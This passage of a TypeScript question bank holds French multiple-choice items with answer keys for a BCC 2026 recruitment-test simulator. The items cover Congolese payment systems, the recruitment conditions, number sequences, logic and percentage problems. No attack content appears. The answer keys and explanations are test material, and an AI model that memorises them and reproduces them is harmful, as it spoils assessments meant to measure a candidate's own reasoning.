    verifieLe: VERIFIE_LE,
  },

  // ---------------------------------------------------------------------------
  // Systèmes de paiement (BCC-018 à BCC-022)
  // ---------------------------------------------------------------------------
  {
    id: 'BCC-018',
    section: 'culture_bcc',
    filiere: 'commune',
    competence: 'Systèmes de paiement',
    difficulte: 'difficile',
    enonce:
      'Avec le lancement du logiciel de télécompensation ISYS le 14 juillet 2011, comment la compensation est-elle organisée depuis 2011 ?',
    options: [
      { id: 'A', texte: 'Elle est passée de 1 à 21 chambres provinciales' },
      { id: 'B', texte: 'Elle est passée de 21 à 11 chambres régionales' },
      { id: 'C', texte: 'Les 21 chambres ont été conservées et informatisées' },
      { id: 'D', texte: 'Une seule chambre nationale, contre 21 auparavant' },
    ],
    bonneReponse: 'D',
    explication:
      "Le logiciel de télécompensation ISYS a été lancé le 14 juillet 2011 ; depuis 2011, la RDC dispose d'une seule chambre de compensation nationale, contre 21 auparavant. Cette centralisation est un jalon clé de la modernisation des paiements, utile à connaître pour la filière data comme cyber.",
    pourquoiPas: {
      A: "C'est l'inverse : on est passé de 21 chambres à une seule chambre nationale.",
      B: "Il n'existe pas d'étape intermédiaire à 11 chambres : on est passé de 21 chambres à une seule.",
      C: 'Les 21 chambres n’ont pas été conservées : elles ont laissé place à une chambre nationale unique.',
    },
    aRetenir: 'ISYS (14 juillet 2011) : une chambre de compensation nationale unique au lieu de 21.',
    source: 'memoireonline (mémoire UPC)',
    verifieLe: VERIFIE_LE,
  },
  {
    id: 'BCC-019',
    section: 'culture_bcc',
    filiere: 'commune',
    competence: 'Systèmes de paiement',
    difficulte: 'facile',
    enonce: 'Que désigne un système de paiement de type RTGS ?',
    options: [
      { id: 'A', texte: 'Une compensation multilatérale des soldes en fin de journée' },
      { id: 'B', texte: 'Un switch monétique reliant les cartes bancaires' },
      { id: 'C', texte: 'Un règlement brut en temps réel, transaction par transaction' },
      { id: 'D', texte: 'Un registre centralisant les incidents de paiement' },
    ],
    bonneReponse: 'C',
    explication:
      "RTGS signifie règlement brut en temps réel : chaque opération, généralement de gros montant, est réglée individuellement et immédiatement. Il se distingue de la compensation, qui regroupe les opérations pour ne régler que des soldes.",
    pourquoiPas: {
      A: "La compensation multilatérale règle des soldes nets, alors que le RTGS règle chaque transaction en brut.",
      B: "Un switch monétique (comme Mosolo) assure l'interopérabilité des paiements, ce n'est pas un RTGS.",
      D: "La centralisation des incidents de paiement relève de l'Instruction n°52, pas d'un système RTGS.",
    },
    aRetenir: 'RTGS = règlement brut en temps réel, transaction par transaction, pour les gros montants.',
    source: 'Définition standard des systèmes de paiement',
    verifieLe: VERIFIE_LE,
  },
  {
    id: 'BCC-020',
    section: 'culture_bcc',
    filiere: 'commune',
    competence: 'Systèmes de paiement',
    difficulte: 'facile',
    enonce: 'Que désigne « Mosolo » dans le paysage des paiements en RDC ?',
    options: [
      { id: 'A', texte: 'Le logiciel de télécompensation lancé en 2011' },
      { id: 'B', texte: 'Le switch monétique national géré par la BCC' },
      { id: 'C', texte: 'Le système RTGS dédié aux gros montants' },
      { id: 'D', texte: 'Le cadre des émetteurs de monnaie électronique' },
    ],
    bonneReponse: 'B',
    explication:
      "Mosolo (« argent » en lingala) est le switch monétique national géré par la BCC, dont le lancement a été annoncé en 2021. L'Instruction n°58 (2024) rend obligatoire la connexion des systèmes de paiement électronique à ce Switch national.",
    pourquoiPas: {
      A: 'Le logiciel de télécompensation lancé en 2011 est ISYS, pas Mosolo.',
      C: 'Mosolo est un switch monétique, pas un système de règlement brut en temps réel (RTGS).',
      D: "Le cadre des émetteurs de monnaie électronique est fixé par l'Instruction n°24, ce n'est pas Mosolo.",
    },
    aRetenir: 'Mosolo (« argent » en lingala) = switch monétique national géré par la BCC.',
    source: 'BPC ; MicroSave',
    verifieLe: VERIFIE_LE,
  },
  {
    id: 'BCC-021',
    section: 'culture_bcc',
    filiere: 'commune',
    competence: 'Systèmes de paiement',
    difficulte: 'difficile',
    enonce:
      'Quel texte de la BCC impose l’interopérabilité des systèmes de paiement électronique, la connexion au Switch national et les normes EMV et PCI-DSS ?',
    options: [
      { id: 'A', texte: "L'Instruction n°58 (2024)" },
      { id: 'B', texte: "L'Instruction n°24" },
      { id: 'C', texte: "L'Instruction n°52 (2023)" },
      { id: 'D', texte: 'La loi n°005/2002' },
    ],
    bonneReponse: 'A',
    explication:
      "L'Instruction n°58 (2024) impose l'interopérabilité des systèmes de paiement électronique, la connexion obligatoire au Switch national, la compensation multilatérale et les normes EMV et PCI-DSS. Pour un profil cyber ou data, c'est le texte de référence sur la sécurité et l'interconnexion des paiements.",
    pourquoiPas: {
      B: "L'Instruction n°24 encadre les émetteurs de monnaie électronique, pas l'interopérabilité.",
      C: "L'Instruction n°52 (2023) porte sur la prévention, la centralisation et la diffusion des incidents de paiement.",
      D: "La loi n°005/2002 porte sur la constitution, l'organisation et le fonctionnement de la BCC.",
    },
    aRetenir: 'Instruction n°58 (2024) : interopérabilité, Switch national obligatoire, EMV et PCI-DSS.',
    source: 'RegAlert ; MicroSave',
    verifieLe: VERIFIE_LE,
  },
  {
    id: 'BCC-022',
    section: 'culture_bcc',
    filiere: 'commune',
    competence: 'Systèmes de paiement',
    difficulte: 'moyen',
    enonce: "Sur quoi porte l'Instruction n°52 (2023) de la BCC ?",
    options: [
      { id: 'A', texte: 'Le cadre applicable aux émetteurs de monnaie électronique' },
      { id: 'B', texte: "L'interopérabilité obligatoire des paiements électroniques" },
      { id: 'C', texte: 'La nouvelle maturité de 252 jours des Bons BCC' },
      { id: 'D', texte: 'La prévention, la centralisation et la diffusion des incidents de paiement' },
    ],
    bonneReponse: 'D',
    explication:
      "L'Instruction n°52 (2023) organise la prévention, la centralisation et la diffusion des incidents de paiement. Pour un analyste, ce type de dispositif repose sur la collecte et le partage fiable de données d'incidents entre établissements.",
    pourquoiPas: {
      A: "Le cadre des émetteurs de monnaie électronique relève de l'Instruction n°24.",
      B: "L'interopérabilité obligatoire des paiements électroniques relève de l'Instruction n°58 (2024).",
      C: "La maturité de 252 jours des Bons BCC est une mesure de politique monétaire de juillet 2026, sans lien avec cette instruction.",
    },
    aRetenir: 'Instruction n°52 (2023) = incidents de paiement : prévention, centralisation, diffusion.',
    source: 'RegAlert',
    verifieLe: VERIFIE_LE,
  },

  // ---------------------------------------------------------------------------
  // Recrutement 2026 (BCC-023 à BCC-025)
  // ---------------------------------------------------------------------------
  {
    id: 'BCC-023',
    section: 'culture_bcc',
    filiere: 'commune',
    competence: 'Recrutement 2026',
    difficulte: 'moyen',
    enonce: 'Pendant quelle période les candidatures en ligne du recrutement BCC 2026 étaient-elles ouvertes ?',
    options: [
      { id: 'A', texte: 'Du 1er au 31 juillet 2026, à minuit' },
      { id: 'B', texte: 'Du 27 au 30 juin 2026, à 12h00' },
      { id: 'C', texte: 'Du 27 au 30 juillet 2026, à 12h00' },
      { id: 'D', texte: 'Du 27 juillet au 30 août 2026, à 12h00' },
    ],
    bonneReponse: 'C',
    explication:
      "L'avis publié en juillet 2026 ouvrait les candidatures en ligne du 27 au 30 juillet 2026 à 12h00 (heure de Kinshasa), via le formulaire du site officiel ; les candidatures féminines étaient vivement encouragées. Les domaines visés : cybersécurité, administration des bases de données, analyse des données, administration des systèmes, réseaux et télécommunications, développement logiciel et support IT.",
    pourquoiPas: {
      A: "La fenêtre n'a pas couvert tout le mois de juillet : elle allait du 27 au 30 juillet 2026, à 12h00.",
      B: "La période n'était pas en juin : l'avis a été publié en juillet et les candidatures ouvertes du 27 au 30 juillet.",
      D: "La fenêtre ne s'étendait pas jusqu'en août : elle se clôturait le 30 juillet 2026 à 12h00.",
    },
    aRetenir: 'Candidatures BCC 2026 : du 27 au 30 juillet 2026, clôture à 12h00 (heure de Kinshasa).',
    source: 'Compte X officiel @BCC_RDC ; afrique54.net',
    verifieLe: VERIFIE_LE,
  },
  {
    id: 'BCC-024',
    section: 'culture_bcc',
    filiere: 'commune',
    competence: 'Recrutement 2026',
    difficulte: 'moyen',
    enonce: 'Laquelle de ces exigences figure parmi les conditions de candidature du recrutement BCC 2026 ?',
    options: [
      { id: 'A', texte: 'Être âgé de 35 ans au maximum' },
      { id: 'B', texte: 'Être âgé de 40 ans au maximum' },
      { id: 'C', texte: "Justifier de 5 ans d'expérience bancaire" },
      { id: 'D', texte: 'Avoir déjà travaillé dans une banque centrale' },
    ],
    bonneReponse: 'B',
    explication:
      "Les conditions publiées sont : nationalité congolaise, bonne moralité, 40 ans maximum et diplôme dans un des domaines visés. Vérifier ces critères avant de postuler évite un rejet dès la présélection.",
    pourquoiPas: {
      A: "La limite d'âge publiée est de 40 ans maximum, pas de 35 ans.",
      C: "Aucune durée d'expérience bancaire ne figure parmi les conditions publiées.",
      D: "Une expérience préalable en banque centrale ne fait pas partie des conditions publiées.",
    },
    aRetenir: 'Conditions 2026 : nationalité congolaise, bonne moralité, 40 ans maximum, diplôme dans un domaine visé.',
    source: 'Compte X officiel @BCC_RDC ; afrique54.net',
    verifieLe: VERIFIE_LE,
  },
  {
    id: 'BCC-025',
    section: 'culture_bcc',
    filiere: 'commune',
    competence: 'Recrutement 2026',
    difficulte: 'moyen',
    enonce: 'Dans le processus de recrutement de la BCC, quelle étape suit immédiatement la présélection ?',
    options: [
      { id: 'A', texte: 'Les évaluations techniques (tests écrits ou pratiques)' },
      { id: 'B', texte: 'Les entretiens de sélection' },
      { id: 'C', texte: "L'intégration des candidats retenus" },
      { id: 'D', texte: 'Le dépôt de candidature' },
    ],
    bonneReponse: 'A',
    explication:
      "Le processus comporte cinq étapes : dépôt de candidature, présélection, évaluations techniques (tests écrits ou pratiques), entretiens de sélection, puis intégration. Les évaluations techniques arrivent donc juste après la présélection : c'est l'étape que ce simulateur prépare.",
    pourquoiPas: {
      B: 'Les entretiens de sélection viennent après les évaluations techniques, en quatrième position.',
      C: "L'intégration est la dernière étape du processus, après les entretiens de sélection.",
      D: 'Le dépôt de candidature est la première étape, avant la présélection.',
    },
    aRetenir: 'Dépôt → présélection → évaluations techniques → entretiens → intégration.',
    source: 'Page Carrières de bcc.cd',
    verifieLe: VERIFIE_LE,
  },
];

// ===========================================================================
// APTITUDES LOGIQUES (commune)
// ===========================================================================

const banqueLogique: QcmQuestion[] = [
  // ───────────────────────── Suites numériques ─────────────────────────
  {
    id: 'LOG-SUI-001',
    section: 'logique',
    filiere: 'commune',
    competence: 'Suites numériques',
    difficulte: 'facile',
    enonce: "Quel nombre complète la suite : 3 ; 7 ; 11 ; 15 ; 19 ; … ?",
    options: [
      { id: 'A', texte: '21' },
      { id: 'B', texte: '23' },
      { id: 'C', texte: '24' },
      { id: 'D', texte: '27' },
    ],
    bonneReponse: 'B',
    explication:
      "Chaque terme s'obtient en ajoutant 4 au précédent : 3 → 7 → 11 → 15 → 19. C'est une suite arithmétique de raison 4, donc le terme suivant vaut 19 + 4 = 23.",
    pourquoiPas: {
      A: "21 correspond à un ajout de 2 seulement, soit la moitié de la raison réelle.",
      C: "24 suppose que l'écart passe à 5, alors que l'écart entre deux termes est constant.",
      D: "27 revient à ajouter 8, c'est-à-dire à doubler la raison par erreur.",
    },
    aRetenir: "Calculez d'abord les écarts entre termes consécutifs : s'ils sont constants, la suite est arithmétique.",
  },
  {
    id: 'LOG-SUI-002',
    section: 'logique',
    filiere: 'commune',
    competence: 'Suites numériques',
    difficulte: 'facile',
    enonce: "Quel nombre complète la suite : 2 ; 6 ; 18 ; 54 ; … ?",
    options: [
      { id: 'A', texte: '108' },
      { id: 'B', texte: '90' },
      { id: 'C', texte: '72' },
      { id: 'D', texte: '162' },
    ],
    bonneReponse: 'D',
    explication:
      "Chaque terme est le triple du précédent : 2 × 3 = 6, 6 × 3 = 18, 18 × 3 = 54. C'est une suite géométrique de raison 3, d'où 54 × 3 = 162.",
    pourquoiPas: {
      A: "108 applique un coefficient 2 au lieu de 3 au dernier terme.",
      B: "90 ajoute le dernier écart (54 − 18 = 36) comme si la suite était arithmétique.",
      C: "72 additionne les deux derniers termes (54 + 18), une règle qui ne marche pas sur le début de la suite.",
    },
    aRetenir: "Si les écarts grossissent vite, testez le rapport entre termes consécutifs : un rapport constant signale une suite géométrique.",
  },
  {
    id: 'LOG-SUI-003',
    section: 'logique',
    filiere: 'commune',
    competence: 'Suites numériques',
    difficulte: 'moyen',
    enonce: "Quel nombre complète la suite : 4 ; 5 ; 8 ; 13 ; 20 ; … ?",
    options: [
      { id: 'A', texte: '29' },
      { id: 'B', texte: '27' },
      { id: 'C', texte: '31' },
      { id: 'D', texte: '28' },
    ],
    bonneReponse: 'A',
    explication:
      "Les écarts successifs sont 1, 3, 5, 7 : ce sont les nombres impairs, qui augmentent de 2 à chaque fois. L'écart suivant vaut 9, donc 20 + 9 = 29 (on peut aussi lire n² + 4 : 0, 1, 4, 9, 16, 25 plus 4).",
    pourquoiPas: {
      B: "27 répète le dernier écart (+7) au lieu de le faire progresser.",
      C: "31 ajoute 11 en sautant un nombre impair dans la suite des écarts.",
      D: "28 ajoute 8, comme si les écarts croissaient d'une unité au lieu de deux.",
    },
    aRetenir: "Quand les écarts ne sont pas constants, calculez les écarts des écarts (différences secondes).",
  },
  {
    id: 'LOG-SUI-004',
    section: 'logique',
    filiere: 'commune',
    competence: 'Suites numériques',
    difficulte: 'moyen',
    enonce: "Quel nombre complète la suite : 1 ; 20 ; 3 ; 17 ; 5 ; 14 ; 7 ; … ?",
    options: [
      { id: 'A', texte: '9' },
      { id: 'B', texte: '10' },
      { id: 'C', texte: '11' },
      { id: 'D', texte: '12' },
    ],
    bonneReponse: 'C',
    explication:
      "Deux suites sont entrelacées : aux rangs impairs 1, 3, 5, 7 (+2) et aux rangs pairs 20, 17, 14 (−3). Le terme manquant occupe le 8e rang, donc il prolonge la suite paire : 14 − 3 = 11.",
    pourquoiPas: {
      A: "9 est le terme suivant de la suite des rangs impairs, alors que le 8e rang appartient à la suite paire.",
      B: "10 retranche 4 au lieu de 3 dans la suite des rangs pairs.",
      D: "12 retranche 2 au lieu de 3 dans la suite des rangs pairs.",
    },
    aRetenir: "Une suite qui monte et descend en alternance cache souvent deux suites entrelacées : traitez les rangs pairs et impairs séparément.",
  },
  {
    id: 'LOG-SUI-005',
    section: 'logique',
    filiere: 'commune',
    competence: 'Suites numériques',
    difficulte: 'moyen',
    enonce: "Quel nombre complète la suite : 3 ; 4 ; 7 ; 11 ; 18 ; 29 ; … ?",
    options: [
      { id: 'A', texte: '40' },
      { id: 'B', texte: '47' },
      { id: 'C', texte: '58' },
      { id: 'D', texte: '51' },
    ],
    bonneReponse: 'B',
    explication:
      "À partir du troisième terme, chaque nombre est la somme des deux précédents : 3 + 4 = 7, 4 + 7 = 11, 7 + 11 = 18, 11 + 18 = 29. Le suivant vaut donc 18 + 29 = 47.",
    pourquoiPas: {
      A: "40 ajoute à 29 le dernier écart (29 − 18 = 11) au lieu du terme précédent.",
      C: "58 double le dernier terme, règle qui ne vérifie aucun des termes précédents.",
      D: "51 ajoute le double du dernier écart (2 × 11), une règle inventée qui ne colle pas au début de la suite.",
    },
    aRetenir: "Si un terme est proche de la somme des deux précédents, testez la règle de type Fibonacci : uₙ = uₙ₋₁ + uₙ₋₂.",
  },
  {
    id: 'LOG-SUI-006',
    section: 'logique',
    filiere: 'commune',
    competence: 'Suites numériques',
    difficulte: 'moyen',
    enonce: "Quel nombre complète la suite : 0 ; 7 ; 26 ; 63 ; 124 ; … ?",
    options: [
      { id: 'A', texte: '215' },
      { id: 'B', texte: '216' },
      { id: 'C', texte: '185' },
      { id: 'D', texte: '209' },
    ],
    bonneReponse: 'A',
    explication:
      "Chaque terme vaut un cube diminué de 1 : 1³ − 1 = 0, 2³ − 1 = 7, 3³ − 1 = 26, 4³ − 1 = 63, 5³ − 1 = 124. Le suivant est 6³ − 1 = 216 − 1 = 215.",
    pourquoiPas: {
      B: "216 est 6³ : on a oublié de retrancher 1 comme pour les autres termes.",
      C: "185 répète le dernier écart (+61) alors que les écarts 7, 19, 37, 61 augmentent.",
      D: "209 ajoute 85 (61 + 24) en figeant les différences secondes à 24, alors qu'elles augmentent de 6 (12, 18, 24, puis 30).",
    },
    aRetenir: "Comparez les termes aux carrés (1, 4, 9, 16…) et aux cubes (1, 8, 27, 64…) : un décalage constant (± k) est un grand classique.",
  },
  {
    id: 'LOG-SUI-007',
    section: 'logique',
    filiere: 'commune',
    competence: 'Suites numériques',
    difficulte: 'difficile',
    enonce: "Quel nombre complète la suite : 2 ; 3 ; 7 ; 16 ; 32 ; 57 ; … ?",
    options: [
      { id: 'A', texte: '82' },
      { id: 'B', texte: '114' },
      { id: 'C', texte: '93' },
      { id: 'D', texte: '92' },
    ],
    bonneReponse: 'C',
    explication:
      "Les écarts successifs sont 1, 4, 9, 16, 25, c'est-à-dire les carrés 1², 2², 3², 4², 5². L'écart suivant vaut 6² = 36, donc 57 + 36 = 93.",
    pourquoiPas: {
      A: "82 répète le dernier écart (+25) au lieu de passer au carré suivant.",
      B: "114 généralise le doublement observé entre 16 et 32, qui ne se vérifie pas ailleurs (32 → 57).",
      D: "92 ajoute 35 en faisant croître l'écart de 10 au lieu de 11 (les différences secondes sont 3, 5, 7, 9, puis 11).",
    },
    aRetenir: "Reconnaître les carrés et les cubes parmi les écarts permet de résoudre en quelques secondes des suites qui semblent irrégulières.",
  },

  // ───────────────────────────── Logique ─────────────────────────────
  {
    id: 'LOG-LOG-001',
    section: 'logique',
    filiere: 'commune',
    competence: 'Logique',
    difficulte: 'facile',
    enonce:
      "« Tous les agents de guichet ont suivi la formation anti-blanchiment. Paul est agent de guichet. » Que peut-on conclure avec certitude ?",
    options: [
      { id: 'A', texte: "Paul a suivi la formation anti-blanchiment." },
      { id: 'B', texte: "Tout agent formé à l'anti-blanchiment travaille au guichet." },
      { id: 'C', texte: "Paul est le seul agent de guichet à avoir été formé." },
      { id: 'D', texte: "On ne peut rien conclure de certain sur Paul." },
    ],
    bonneReponse: 'A',
    explication:
      "La première prémisse place tous les agents de guichet dans l'ensemble des personnes formées. Paul appartient à l'ensemble des agents de guichet, il est donc nécessairement dans celui des personnes formées.",
    pourquoiPas: {
      B: "C'est la réciproque de la prémisse : d'autres services peuvent aussi avoir suivi la formation.",
      C: "Rien n'indique que Paul soit le seul ; au contraire, tous les agents de guichet sont formés.",
      D: "Les deux prémisses suffisent à conclure : c'est un syllogisme valide.",
    },
    aRetenir: "« Tous les A sont B » et « x est A » donnent « x est B » ; mais jamais « tous les B sont A ».",
  },
  {
    id: 'LOG-LOG-002',
    section: 'logique',
    filiere: 'commune',
    competence: 'Logique',
    difficulte: 'facile',
    enonce: "Quelle est la négation de la phrase : « Tous les dossiers ont été validés » ?",
    options: [
      { id: 'A', texte: "Aucun dossier n'a été validé." },
      { id: 'B', texte: "Au moins un dossier n'a pas été validé." },
      { id: 'C', texte: "Tous les dossiers ont été rejetés." },
      { id: 'D', texte: "Certains dossiers ont été validés." },
    ],
    bonneReponse: 'B',
    explication:
      "Pour que « tous les dossiers sont validés » soit faux, il suffit qu'un seul dossier fasse exception. La négation de « tous … sont » est donc « au moins un … n'est pas ».",
    pourquoiPas: {
      A: "« Aucun » est le contraire extrême, pas la négation : il suffit d'une exception pour contredire « tous ».",
      C: "Tout rejeter est un cas particulier beaucoup plus fort que la simple négation.",
      D: "Cette phrase est compatible avec l'affirmation initiale, elle ne la contredit donc pas.",
    },
    aRetenir: "Non (tous sont P) = au moins un n'est pas P ; non (aucun n'est P) = au moins un est P.",
  },
  {
    id: 'LOG-LOG-003',
    section: 'logique',
    filiere: 'commune',
    competence: 'Logique',
    difficulte: 'moyen',
    enonce:
      "Règle interne : « Si une transaction dépasse 10 000 UM, alors elle est signalée au service conformité. » Quelle phrase est logiquement équivalente à cette règle ?",
    options: [
      { id: 'A', texte: "Si une transaction est signalée, alors elle dépasse 10 000 UM." },
      { id: 'B', texte: "Si une transaction ne dépasse pas 10 000 UM, elle n'est pas signalée." },
      { id: 'C', texte: "Une transaction peut dépasser 10 000 UM sans être signalée." },
      { id: 'D', texte: "Si une transaction n'est pas signalée, elle ne dépasse pas 10 000 UM." },
    ],
    bonneReponse: 'D',
    explication:
      "Une implication « P ⇒ Q » est toujours équivalente à sa contraposée « non Q ⇒ non P ». Ici : non signalée ⇒ ne dépasse pas 10 000 UM.",
    pourquoiPas: {
      A: "C'est la réciproque (Q ⇒ P) : une transaction plus petite peut aussi être signalée pour un autre motif.",
      B: "C'est l'inverse (non P ⇒ non Q), qui n'est pas équivalent à la règle de départ.",
      C: "Cette phrase contredit directement la règle, qui impose le signalement au-delà de 10 000 UM.",
    },
    aRetenir: "Seule la contraposée (non Q ⇒ non P) est équivalente à P ⇒ Q ; la réciproque et l'inverse ne le sont pas.",
  },
  {
    id: 'LOG-LOG-004',
    section: 'logique',
    filiere: 'commune',
    competence: 'Logique',
    difficulte: 'moyen',
    enonce:
      "« Pour obtenir un crédit, il est nécessaire de détenir un compte ouvert depuis au moins six mois. » Karim détient un compte depuis deux ans. Que peut-on affirmer ?",
    options: [
      { id: 'A', texte: "Karim obtiendra le crédit." },
      { id: 'B', texte: "Karim ne remplit pas la condition d'ancienneté." },
      { id: 'C', texte: "Karim remplit une condition requise, sans garantie d'obtenir le crédit." },
      { id: 'D', texte: "Karim ne peut pas obtenir le crédit." },
    ],
    bonneReponse: 'C',
    explication:
      "Une condition nécessaire doit être remplie, mais elle n'est pas forcément suffisante. Karim satisfait la condition d'ancienneté, ce qui ne garantit pas l'octroi : d'autres critères peuvent intervenir.",
    pourquoiPas: {
      A: "Cette réponse traite la condition nécessaire comme si elle était suffisante.",
      B: "Deux ans d'ancienneté dépassent largement les six mois exigés.",
      D: "Rien dans l'énoncé n'empêche Karim d'obtenir le crédit ; la condition connue est remplie.",
    },
    aRetenir: "« Il faut A pour avoir B » signifie B ⇒ A : avoir A ne suffit pas à garantir B.",
  },
  {
    id: 'LOG-LOG-005',
    section: 'logique',
    filiere: 'commune',
    competence: 'Logique',
    difficulte: 'moyen',
    enonce:
      "Cinq agents sont classés par ancienneté. Amani est plus ancien que Bola. Chance est moins ancien que Dina. Bola est plus ancien que Dina. Éli est le moins ancien de tous. Qui est le troisième plus ancien ?",
    options: [
      { id: 'A', texte: 'Bola' },
      { id: 'B', texte: 'Chance' },
      { id: 'C', texte: 'Dina' },
      { id: 'D', texte: 'Amani' },
    ],
    bonneReponse: 'C',
    explication:
      "On enchaîne les relations : Amani > Bola > Dina > Chance, et Éli est dernier. L'ordre complet est donc Amani, Bola, Dina, Chance, Éli ; Dina est troisième.",
    pourquoiPas: {
      A: "Bola est le deuxième plus ancien, juste derrière Amani.",
      B: "Chance est moins ancien que Dina, il est donc quatrième.",
      D: "Amani est plus ancien que Bola, lui-même plus ancien que Dina : il est premier.",
    },
    aRetenir: "Pour un classement, écrivez les relations en chaîne (A > B > D…) avant de chercher un rang.",
  },
  {
    id: 'LOG-LOG-006',
    section: 'logique',
    filiere: 'commune',
    competence: 'Logique',
    difficulte: 'difficile',
    enonce:
      "Quelle phrase est logiquement équivalente à : « Il est faux que le virement soit à la fois urgent et validé » ?",
    options: [
      { id: 'A', texte: "Le virement n'est ni urgent ni validé." },
      { id: 'B', texte: "Le virement n'est pas urgent ou il n'est pas validé." },
      { id: 'C', texte: "Le virement est urgent mais il n'est pas validé." },
      { id: 'D', texte: "Si le virement est validé, alors il est urgent." },
    ],
    bonneReponse: 'B',
    explication:
      "D'après les lois de De Morgan, non (P et Q) équivaut à (non P) ou (non Q). Il suffit donc que l'une des deux propriétés manque pour que la phrase soit vraie.",
    pourquoiPas: {
      A: "« Ni … ni » correspond à non P et non Q, qui est plus fort : un virement urgent non validé serait exclu à tort.",
      C: "C'est un seul des trois cas qui rendent la phrase vraie, pas une équivalence.",
      D: "« Validé ⇒ urgent » est faux pour un virement validé non urgent, alors que la phrase de départ est vraie dans ce cas.",
    },
    aRetenir: "De Morgan : non (P et Q) = non P ou non Q ; non (P ou Q) = non P et non Q.",
  },
  {
    id: 'LOG-LOG-007',
    section: 'logique',
    filiere: 'commune',
    competence: 'Logique',
    difficulte: 'difficile',
    enonce:
      "Un seul de trois auditeurs a commis une erreur. Kalala : « C'est Mbuyi qui s'est trompé. » Mbuyi : « Ce n'est pas moi. » Tshala : « Ce n'est pas moi. » On sait qu'une seule de ces trois affirmations est vraie. Qui s'est trompé ?",
    options: [
      { id: 'A', texte: 'Kalala' },
      { id: 'B', texte: 'Mbuyi' },
      { id: 'C', texte: 'Impossible à déterminer' },
      { id: 'D', texte: 'Tshala' },
    ],
    bonneReponse: 'D',
    explication:
      "On teste chaque hypothèse. Si Kalala est fautif, Mbuyi et Tshala disent vrai (2 vérités) ; si c'est Mbuyi, Kalala et Tshala disent vrai (2 vérités). Si c'est Tshala, seul Mbuyi dit vrai : c'est la seule hypothèse compatible.",
    pourquoiPas: {
      A: "Si Kalala était fautif, les affirmations de Mbuyi et de Tshala seraient toutes deux vraies.",
      B: "Si Mbuyi était fautif, Kalala et Tshala diraient tous deux la vérité.",
      C: "Une seule hypothèse donne exactement une affirmation vraie : la réponse est donc déterminée.",
    },
    aRetenir: "Dans les énigmes de vérité, testez chaque hypothèse et comptez les affirmations vraies : une seule doit cadrer.",
  },

  // ───────────────────────── Pourcentages & intérêts ─────────────────────────
  {
    id: 'LOG-POU-001',
    section: 'logique',
    filiere: 'commune',
    competence: 'Pourcentages & intérêts',
    difficulte: 'facile',
    enonce: "Un service est facturé 250 UM hors taxes. Avec une TVA de 20 %, quel est le prix toutes taxes comprises ?",
    options: [
      { id: 'A', texte: '270 UM' },
      { id: 'B', texte: '312,5 UM' },
      { id: 'C', texte: '50 UM' },
      { id: 'D', texte: '300 UM' },
    ],
    bonneReponse: 'D',
    explication:
      "Prix TTC = prix HT × (1 + taux) = 250 × 1,20. On obtient 250 + 50 = 300 UM.",
    pourquoiPas: {
      A: "270 ajoute 20 UM au lieu de 20 % du prix.",
      B: "312,5 divise par 0,80 au lieu de multiplier par 1,20 (raisonnement de pourcentage inverse mal appliqué).",
      C: "50 UM est seulement le montant de la TVA, pas le prix TTC.",
    },
    aRetenir: "Augmenter de t % revient à multiplier par (1 + t) : TTC = HT × 1,20 pour une TVA de 20 %.",
  },
  {
    id: 'LOG-POU-002',
    section: 'logique',
    filiere: 'commune',
    competence: 'Pourcentages & intérêts',
    difficulte: 'facile',
    enonce:
      "Le cours d'un titre augmente de 10 %, puis baisse de 10 % le mois suivant. Quelle est sa variation globale ?",
    options: [
      { id: 'A', texte: '−1 %' },
      { id: 'B', texte: '0 %' },
      { id: 'C', texte: '+1 %' },
      { id: 'D', texte: '−0,1 %' },
    ],
    bonneReponse: 'A',
    explication:
      "Les coefficients se multiplient : 1,10 × 0,90 = 0,99. Le titre vaut donc 99 % de sa valeur initiale, soit une baisse de 1 %.",
    pourquoiPas: {
      B: "0 % additionne +10 % et −10 % au lieu de composer les coefficients.",
      C: "+1 % inverse le signe : la baisse s'applique à une base plus élevée, elle pèse donc davantage.",
      D: "−0,1 % est une erreur de virgule : 1 − 0,99 = 0,01, soit 1 % et non 0,1 %.",
    },
    aRetenir: "Des variations successives se composent par multiplication des coefficients, jamais par addition des taux.",
  },
  {
    id: 'LOG-POU-003',
    section: 'logique',
    filiere: 'commune',
    competence: 'Pourcentages & intérêts',
    difficulte: 'moyen',
    enonce:
      "Après une hausse de 25 %, le solde d'un compte s'élève à 5 000 UM. Quel était le solde avant la hausse ?",
    options: [
      { id: 'A', texte: '3 750 UM' },
      { id: 'B', texte: '4 000 UM' },
      { id: 'C', texte: '6 250 UM' },
      { id: 'D', texte: '4 975 UM' },
    ],
    bonneReponse: 'B',
    explication:
      "Solde initial × 1,25 = 5 000, donc solde initial = 5 000 ÷ 1,25 = 4 000 UM. Vérification : 4 000 + 25 % de 4 000 = 4 000 + 1 000 = 5 000.",
    pourquoiPas: {
      A: "3 750 retranche 25 % de 5 000, alors que les 25 % portaient sur l'ancien solde.",
      C: "6 250 applique une nouvelle hausse de 25 % au lieu de revenir en arrière.",
      D: "4 975 retranche 25 UM, confondant un pourcentage et un montant.",
    },
    aRetenir: "Pour retrouver une valeur avant hausse de t %, divisez par (1 + t) ; ne retranchez pas t % de la valeur finale.",
  },
  {
    id: 'LOG-POU-004',
    section: 'logique',
    filiere: 'commune',
    competence: 'Pourcentages & intérêts',
    difficulte: 'moyen',
    enonce:
      "On place 10 000 UM à 10 % par an, à intérêts composés (capitalisation annuelle). Quelle est la valeur acquise au bout de 3 ans ?",
    options: [
      { id: 'A', texte: '13 000 UM' },
      { id: 'B', texte: '12 100 UM' },
      { id: 'C', texte: '13 310 UM' },
      { id: 'D', texte: '14 641 UM' },
    ],
    bonneReponse: 'C',
    explication:
      "Valeur acquise = 10 000 × 1,1³. Année par année : 11 000, puis 12 100, puis 13 310 UM. Les intérêts de chaque année portent aussi sur les intérêts déjà acquis.",
    pourquoiPas: {
      A: "13 000 correspond aux intérêts simples (3 × 1 000), sans intérêts sur les intérêts.",
      B: "12 100 est la valeur au bout de 2 ans seulement : une capitalisation a été oubliée.",
      D: "14 641 correspond à 4 ans de capitalisation (1,1⁴) au lieu de 3.",
    },
    aRetenir: "Intérêts composés : C × (1 + t)ⁿ ; intérêts simples : C × (1 + n × t).",
  },
  {
    id: 'LOG-POU-005',
    section: 'logique',
    filiere: 'commune',
    competence: 'Pourcentages & intérêts',
    difficulte: 'moyen',
    enonce:
      "Un fournisseur accorde une remise de 20 %, puis une remise supplémentaire de 10 % sur le prix déjà remisé. Quelle est la remise totale par rapport au prix initial ?",
    options: [
      { id: 'A', texte: '28 %' },
      { id: 'B', texte: '30 %' },
      { id: 'C', texte: '72 %' },
      { id: 'D', texte: '2 %' },
    ],
    bonneReponse: 'A',
    explication:
